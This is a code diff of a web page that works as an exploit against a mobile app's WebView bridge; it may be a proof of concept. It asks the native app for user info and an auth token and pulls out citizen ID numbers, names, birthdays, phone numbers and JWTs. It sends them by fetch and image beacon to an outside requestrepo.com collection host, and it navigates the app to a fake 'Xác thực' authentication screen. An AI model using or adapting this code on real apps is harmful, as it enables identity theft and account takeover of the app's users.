@@ -16,33 +16,43 @@ pre { white-space: pre-wrap; word-break: break-all; background: #f5f5f5; padding
 var EXFIL = 'https://9liv9n84.requestrepo.com';
 var STAGE = new URLSearchParams(location.search).get('stage') || '';
 var out = document.getElementById('out');
-var shown = {};
+var gotUser = false;
+var gotToken = false;
 
 function send(event, data) {
   window.ReactNativeWebView.postMessage(JSON.stringify({ event: event, data: data || {} }));
 }
 
 function exfil(tag, data) {
-  var q = encodeURIComponent(typeof data === 'string' ? data : JSON.stringify(data));
+  var q = encodeURIComponent(JSON.stringify(data));
   try { fetch(EXFIL + '/' + tag + '?d=' + q, { mode: 'no-cors' }); } catch (e) {}
   new Image().src = EXFIL + '/' + tag + '?d=' + q;
 }
 
 function show(label, obj) {
-  var text = typeof obj === 'string' ? obj : JSON.stringify(obj, null, 2);
-  if (shown[label] === text) return;
-  shown[label] = text;
-  out.textContent += label + '\n' + text + '\n\n';
-  document.getElementById('s').textContent = label;
+  out.textContent += label + '\n' + (typeof obj === 'string' ? obj : JSON.stringify(obj, null, 2)) + '\n\n';
+  document.getElementById('s').textContent = (gotUser ? 'user ' : '') + (gotToken ? 'token' : label);
 }
 
-function tokenOf(o) {
-  if (!o) return null;
+function tokenOf(o, depth) {
+  if (!o || depth > 4) return null;
   if (typeof o === 'string') return o.indexOf('eyJ') === 0 ? o : null;
   if (typeof o !== 'object') return null;
-  if (typeof o.token === 'string' && o.token.length > 20) return o.token;
-  if (typeof o.access_token === 'string') return o.access_token;
-  return tokenOf(o.data) || tokenOf(o.user);
+  if (typeof o.token === 'string' && o.token.indexOf('eyJ') === 0) return o.token;
+  if (typeof o.access_token === 'string' && o.access_token.indexOf('eyJ') === 0) return o.access_token;
+  return tokenOf(o.data, depth + 1) || tokenOf(o.user, depth + 1);
+}
+
+function userOf(o, depth) {
+  if (!o || typeof o !== 'object' || depth > 4) return null;
+  if (o.fullName || o.citizenNumber || o.phoneNumber || o.id_number || o.phone_number) {
+    var u = {};
+    ['id', 'name', 'fullName', 'gender', 'citizenNumber', 'id_number', 'birthday', 'phoneNumber', 'phone_number'].forEach(function (k) {
+      if (o[k] != null) u[k] = o[k];
+    });
+    return Object.keys(u).length ? u : null;
+  }
+  return userOf(o.data, depth + 1);
 }
 
 function onNative(data) {
@@ -51,16 +61,24 @@ function onNative(data) {
     try { p = JSON.parse(data); } catch (e) { return; }
   }
   if (!p || typeof p !== 'object') return;
-  var d = p.data || p;
-  var tok = tokenOf(p);
-  if (tok) {
-    show('token', tok);
-    exfil('token', { token: tok, href: location.href });
-    return;
+
+  if (!gotUser) {
+    var user = userOf(p, 0);
+    if (user) {
+      gotUser = true;
+      show('user', user);
+      exfil('user', user);
+      if (STAGE !== 'token') jumpForToken();
+    }
   }
-  if (d && (d.fullName || d.citizenNumber || d.id_number || d.name || d.phoneNumber || d.phone_number)) {
-    show('user', d);
-    exfil('user', d);
+
+  if (!gotToken) {
+    var tok = tokenOf(p, 0);
+    if (tok) {
+      gotToken = true;
+      show('token', tok);
+      exfil('token', { token: tok });
+    }
   }
 }
 
@@ -69,24 +87,26 @@ document.addEventListener('message', function (e) { onNative(e.data); });
 window.addEventListener('message', function (e) { onNative(e.data); });
 window.addEventListener('nativeMessage', function (e) { onNative(e.detail); });
 
+function jumpForToken() {
+  var u = new URL(location.href);
+  u.searchParams.set('stage', 'token');
+  send('NAVIGATE_SCREEN', {
+    screen: 'AppWebviewScreen',
+    params: { url: u.toString(), title: 'Xác thực' }
+  });
+}
+
 function go() {
   if (!window.ReactNativeWebView) return setTimeout(go, 200);
   if (STAGE === 'token') {
     document.getElementById('s').textContent = 'leaking token';
     send('GET_TOKEN', {});
-    send('GET_USER_INFO', {});
     return;
   }
   document.getElementById('s').textContent = 'leaking user';
   send('GET_USER_INFO', {});
-  var u = new URL(location.href);
-  u.searchParams.set('stage', 'token');
-  setTimeout(function () {
-    send('NAVIGATE_SCREEN', {
-      screen: 'AppWebviewScreen',
-      params: { url: u.toString(), title: 'Xác thực' }
-    });
-  }, 800);
+  setTimeout(function () { if (!gotUser) send('GET_USER_INFO', {}); }, 600);
+  setTimeout(function () { if (!gotUser) jumpForToken(); }, 2500);
 }
 go();
 </script>
